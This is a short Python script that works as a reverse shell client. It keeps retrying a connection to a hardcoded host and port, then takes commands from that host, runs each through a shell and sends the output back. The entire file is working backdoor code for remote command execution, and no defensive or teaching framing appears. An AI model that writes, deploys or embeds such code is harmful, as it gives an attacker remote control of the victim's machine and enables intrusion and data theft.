import socket
import subprocess
import time


SERVER_IP = "192.168.1.37"
SERVER_PORT = 5678

connecting = False

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    while connecting == False:
        try:
            s.connect((SERVER_IP, SERVER_PORT))
            connecting = True
        except:
            pass

    # data = s.recv(1024)
    
    try:
        while True:
            command = s.recv(999999999)
            command = command.decode()
            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
            output = op.stdout.read() + op.stderr.read()
            # time.sleep()
            s.send(output)
    except:
        print("[+] Connection lost")